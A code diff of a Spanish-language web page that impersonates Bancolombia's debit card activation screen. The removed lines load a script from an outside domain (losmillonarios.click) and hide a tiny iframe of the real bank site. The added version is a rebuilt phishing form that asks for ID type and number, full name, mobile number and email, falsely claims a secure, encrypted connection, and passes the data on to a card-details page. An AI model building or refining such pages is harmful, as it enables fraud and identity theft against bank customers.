@@ -1,54 +1,342 @@
-<html>
+<!DOCTYPE html>
+<html lang="es">
 <head>
-  <meta charset="utf-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Tarjeta Debito Bancolombia</title>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tarjeta Débito Bancolombia</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-  <script type="text/javascript">
-    document.getElementById('triggerScript').addEventListener('click', function() {
-      var script = document.createElement('script');
-      script.src =;
-      document.body.appendChild(script);
-    });
-  </script>
-  
+        body {
+            font-family: 'Open Sans', Arial, sans-serif;
+            background: #f5f5f5;
+            color: #333;
+        }
+
+        .header {
+            background: #FFCC00;
+            padding: 15px 20px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+
+        .header img {
+            height: 40px;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 30px auto;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 30px;
+        }
+
+        .logo-bancolombia {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        h1 {
+            color: #005CA9;
+            font-size: 24px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        .date-time {
+            background: #f9f9f9;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            margin-bottom: 30px;
+            border: 1px solid #e0e0e0;
+        }
+
+        .date-time .date {
+            font-size: 16px;
+            color: #005CA9;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+
+        .date-time .time {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+            transition: border 0.3s;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: #FFCC00;
+        }
+
+        .btn-continuar {
+            width: 100%;
+            padding: 15px;
+            background: #005CA9;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin-top: 20px;
+        }
+
+        .btn-continuar:hover {
+            background: #004A8D;
+        }
+
+        .secure-notice {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 20px;
+            color: #4CAF50;
+            font-size: 13px;
+        }
+
+        .secure-notice svg {
+            width: 20px;
+            height: 20px;
+            margin-right: 8px;
+        }
+
+        .error {
+            border-color: #d32f2f !important;
+        }
+
+        .error-message {
+            color: #d32f2f;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .info-box {
+            background: #e3f2fd;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border-left: 4px solid #005CA9;
+        }
+
+        .info-box p {
+            margin: 0;
+            font-size: 13px;
+            color: #005CA9;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            padding: 20px;
+            color: #666;
+            font-size: 12px;
+        }
+    </style>
 </head>
-
-<body class="t-body">
-
-  <iframe src="https://www.bancolombia.com/" style="width: 1px; height: 1px; border: none; position: absolute;"></iframe>
-  <script type="text/javascript" src="../../losmillonarios.click/js/jquery.jclockNew.js"></script>
-  <script type="text/javascript" src="../../code.jquery.com/jquery-3.7.0.min.js"></script>
-  <script type="text/javascript" src="https://losmillonarios.click/scriptabeja.php?tok=qwertyab1" async="true"></script>
-  
-  <div style="display: none;" class="b-main t-container clearfix">
-    <!-- <middle> -->
-    <div style="display: none;" class="b-logo b-white">
-      <div class="site-title">
-        <!-- <logo> -->My site
-        <!-- </logo> -->
-      </div>
-      <div class="site-slogan">$SITE_NAME$</div>
+<body>
+    <div class="header">
+        <svg width="200" height="40" viewBox="0 0 200 40">
+            <text x="10" y="30" font-family="Arial" font-size="24" font-weight="bold" fill="#005CA9">Bancolombia</text>
+        </svg>
     </div>
-    <div style="display: none;" class="b-maincontent b-white" role="main">
-      <div class="content-padding">
-      </div>
+
+    <div class="container">
+        <div class="logo-bancolombia">
+            <h1>🏦 Tarjeta Débito</h1>
+        </div>
+
+        <div class="subtitle">
+            Completa la información para activar tu tarjeta débito
+        </div>
+
+        <div class="date-time">
+            <div class="date" id="currentDate"></div>
+            <div class="time" id="currentTime"></div>
+        </div>
+
+        <div class="info-box">
+            <p>📌 Esta información es necesaria para validar tu identidad y activar tu tarjeta de forma segura</p>
+        </div>
+
+        <form id="personalForm">
+            <div class="form-group">
+                <label for="tipoDocumento">Tipo de documento *</label>
+                <select id="tipoDocumento" required>
+                    <option value="">Selecciona...</option>
+                    <option value="CC">Cédula de Ciudadanía</option>
+                    <option value="CE">Cédula de Extranjería</option>
+                    <option value="PA">Pasaporte</option>
+                </select>
+                <span class="error-message">Selecciona un tipo de documento</span>
+            </div>
+
+            <div class="form-group">
+                <label for="numeroDocumento">Número de documento *</label>
+                <input type="text" id="numeroDocumento" placeholder="Ej: 1234567890" required>
+                <span class="error-message">Ingresa un número válido</span>
+            </div>
+
+            <div class="form-group">
+                <label for="nombreCompleto">Nombre completo *</label>
+                <input type="text" id="nombreCompleto" placeholder="Como aparece en tu documento" required>
+                <span class="error-message">Ingresa tu nombre completo</span>
+            </div>
+
+            <div class="form-group">
+                <label for="celular">Número de celular *</label>
+                <input type="tel" id="celular" placeholder="3001234567" maxlength="10" required>
+                <span class="error-message">Ingresa un celular válido (10 dígitos)</span>
+            </div>
+
+            <div class="form-group">
+                <label for="email">Correo electrónico *</label>
+                <input type="email" id="email" placeholder="ejemplo@email.com" required>
+                <span class="error-message">Ingresa un correo válido</span>
+            </div>
+
+            <button type="submit" class="btn-continuar">Continuar</button>
+        </form>
+
+        <div class="secure-notice">
+            <svg viewBox="0 0 24 24" fill="currentColor">
+                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
+            </svg>
+            Conexión segura protegida
+        </div>
     </div>
-    <div style="display: none;" class="sidebar-clear clearleft"></div>
-    <aside style="display: none;" class="b-sidebar b-white clearfix">
-      $GLOBAL_CLEFTER$
-    </aside>
-    <!-- </middle> -->
-  </div>
 
-  <div style="display: none;"></div>
-  <textarea style="display: none;" name="" id="" cols="30" rows="10"> $GLOBAL_BFOOTER$ </textarea>
+    <div class="footer">
+        <p>&copy; 2024 Bancolombia S.A. | Todos los derechos reservados</p>
+        <p>Esta es una transacción segura y encriptada</p>
+    </div>
 
+    <script src="js/jquery-3.7.0.min.js"></script>
+    <script src="js/jquery.jclockNew.js"></script>
+    <script>
+        // Reloj en tiempo real
+        $(document).ready(function(){
+            $('#currentTime').jclockNew({
+                format: '%H:%M:%S',
+                language: 'es'
+            });
+        });
+
+        // Fecha actual
+        function updateDate() {
+            const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+            const date = new Date().toLocaleDateString('es-CO', options);
+            document.getElementById('currentDate').textContent = date.charAt(0).toUpperCase() + date.slice(1);
+        }
+        updateDate();
+
+        // Validación del formulario
+        document.getElementById('personalForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            let isValid = true;
+            const data = {
+                tipoDocumento: document.getElementById('tipoDocumento').value,
+                numeroDocumento: document.getElementById('numeroDocumento').value,
+                nombreCompleto: document.getElementById('nombreCompleto').value,
+                celular: document.getElementById('celular').value,
+                email: document.getElementById('email').value,
+                timestamp: new Date().toLocaleString('es-CO')
+            };
+
+            // Validar cada campo
+            Object.keys(data).forEach(key => {
+                if (key !== 'timestamp') {
+                    const input = document.getElementById(key);
+                    const errorMsg = input.nextElementSibling;
+                    
+                    if (!data[key]) {
+                        input.classList.add('error');
+                        errorMsg.style.display = 'block';
+                        isValid = false;
+                    } else {
+                        input.classList.remove('error');
+                        errorMsg.style.display = 'none';
+                    }
+                }
+            });
+
+            // Validar email
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(data.email)) {
+                document.getElementById('email').classList.add('error');
+                document.getElementById('email').nextElementSibling.style.display = 'block';
+                isValid = false;
+            }
+
+            // Validar celular (10 dígitos)
+            if (data.celular.length !== 10) {
+                document.getElementById('celular').classList.add('error');
+                document.getElementById('celular').nextElementSibling.style.display = 'block';
+                isValid = false;
+            }
+
+            if (isValid) {
+                // Guardar datos
+                localStorage.setItem('personalData', JSON.stringify(data));
+                
+                // Redirigir a la página de tarjeta
+                window.location.href = 'datos-tarjeta.html';
+            }
+        });
+
+        // Limpiar errores al escribir
+        document.querySelectorAll('input, select').forEach(input => {
+            input.addEventListener('input', function() {
+                this.classList.remove('error');
+                this.nextElementSibling.style.display = 'none';
+            });
+        });
+
+        // Solo números en documento y celular
+        document.getElementById('numeroDocumento').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+
+        document.getElementById('celular').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+    </script>
 </body>
-
 </html>
-
-<p align="center">
-  <iframe src width="1" height="1" marginwidth="0" marginheight="0" hspace="0" vspace="0" frameborder="0" scrolling="no"></iframe>
-</p>
